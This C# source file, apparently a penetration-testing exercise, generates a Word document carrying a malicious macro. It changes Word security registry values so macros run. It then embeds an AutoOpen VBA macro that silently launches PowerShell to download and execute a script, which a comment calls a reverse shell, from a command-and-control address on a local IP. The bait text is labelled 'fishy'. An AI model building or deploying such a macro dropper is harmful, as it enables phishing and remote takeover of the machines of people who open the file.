using Microsoft.Win32;
using System;
using System.IO;
using System.Runtime.InteropServices;
using VbIntrOP = Microsoft.Vbe.Interop;
using MsWord = Microsoft.Office.Interop.Word;
using System.Windows.Forms;
using System.Reflection;

namespace WordMacro
{
    public partial class WordMacroForm : Form
    {
        public WordMacroForm()
        {
            InitializeComponent();
        }

        private void btnWordGenerator_Click(object sender, EventArgs e)
        {
            #region MsWordCreation
            Object oMissing = Missing.Value;
            object oEndOfDoc = "\\endofdoc"; /* \endofdoc is a predefined bookmark */
            MsWord.Application oWordApp = new MsWord.Application();
            MsWord.Document oWordDoc;// = new MsWord.Document();
            oWordApp.DisplayAlerts = MsWord.WdAlertLevel.wdAlertsNone;
            //xlApp.AutomationSecurity = Microsoft.Office.Core.MsoAutomationSecurity.msoAutomationSecurityForceDisable;
            oWordDoc = oWordApp.Documents.Add(ref oMissing, ref oMissing, ref oMissing, ref oMissing);

            if (oWordDoc == null)
            {
                MessageBox.Show("Failed to create new MSWord Doc");
            }
            string strNormalParaText = @"Sample Paragraph text added for showing pre text demo";

            //Insert a paragraph at the beginning of the document.
            MsWord.Paragraph oPara1;
            oPara1 = oWordDoc.Content.Paragraphs.Add(ref oMissing);
            oPara1.Range.Text = "Prepare a fishy header and paragraph";
            oPara1.Range.Font.Bold = 1;
            oPara1.Format.SpaceAfter = 24;    //24 pt spacing after paragraph.
            oPara1.Range.InsertParagraphAfter();

            //Insert another paragraph.
            MsWord.Paragraph oPara3;
            object oRng = oWordDoc.Bookmarks.get_Item(ref oEndOfDoc).Range;

            oRng = oWordDoc.Bookmarks.get_Item(ref oEndOfDoc).Range;
            oPara3 = oWordDoc.Content.Paragraphs.Add(ref oRng);
            oPara3.Range.Text = strNormalParaText;
            oPara3.Range.Font.Bold = 0;
            oPara3.Format.SpaceAfter = 24;
            oPara3.Range.InsertParagraphAfter();

            #endregion

            #region Required Registry Changes
            string regpath = @"Software\Microsoft\Office\" + oWordApp.Version + @"\Word\Security";

            RegistryKey key = Registry.CurrentUser.OpenSubKey(regpath, true);
            if (key != null)
            {
                key.SetValue("AccessVBOM", "1", RegistryValueKind.DWord);
                key.SetValue("VBAWarnings", "1", RegistryValueKind.DWord);
                key.Close();
            }
            #endregion

            #region VBModule and Macro Creation

            VbIntrOP.VBComponent wordVBMod;
            wordVBMod = oWordDoc.VBProject.VBComponents.Add(VbIntrOP.vbext_ComponentType.vbext_ct_StdModule);
            wordVBMod.Name = "OurMacro";

            //Our reverse shell powershell script will get loaded from our C&C.

            string strMacroRevShell = @"Sub AutoOpen()
 Call Shell(""cmd.exe /c powershell.exe IEX(IWR -uri 'http://192.168.1.75:443/getit.txt')"", 0)
 End Sub
";

            wordVBMod.CodeModule.AddFromString(strMacroRevShell);
            #endregion

            #region SaveWord and Release COM Objects
            string outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, txtSaveAs.Text + ".doc");
            try
            {//save the workbook.
                oWordDoc.SaveAs(outpath, MsWord.WdSaveFormat.wdFormatDocument, Missing.Value, Missing.Value, Missing.Value, Missing.Value, Missing.Value, Missing.Value, Missing.Value, Missing.Value, Missing.Value, Missing.Value);
                MessageBox.Show("Word File with macro created", "C# Pentest VIII", MessageBoxButtons.OK);
            }
            catch (Exception ex)
            {
                //Console.WriteLine(ex.Message);
                //release all memory - stop Word.exe .
                if (wordVBMod != null) { Marshal.ReleaseComObject(wordVBMod); }
                if (oWordDoc != null) { Marshal.ReleaseComObject(oWordDoc); }
                if (oWordApp != null) { Marshal.ReleaseComObject(oWordApp); }

                wordVBMod = null;
                oWordDoc = null;
                oWordApp = null;
                GC.Collect();

                Environment.Exit(0);
            }
            finally
            {
                RegistryKey key2 = Registry.CurrentUser.OpenSubKey(regpath, true);
                if (key2 != null)
                {
                    key2.SetValue("AccessVBOM", "0", RegistryValueKind.DWord);
                    key2.SetValue("VBAWarnings", "0", RegistryValueKind.DWord);
                    key2.Close();
                }
                //release all memory - stop Word.exe .
                if (wordVBMod != null) { Marshal.ReleaseComObject(wordVBMod); }
                if (oWordDoc != null) { Marshal.ReleaseComObject(oWordDoc); }
                if (oWordApp != null) { Marshal.ReleaseComObject(oWordApp); }

                wordVBMod = null;
                oWordDoc = null;
                oWordApp = null;
                GC.Collect();

            }
            #endregion
        }
    }
}
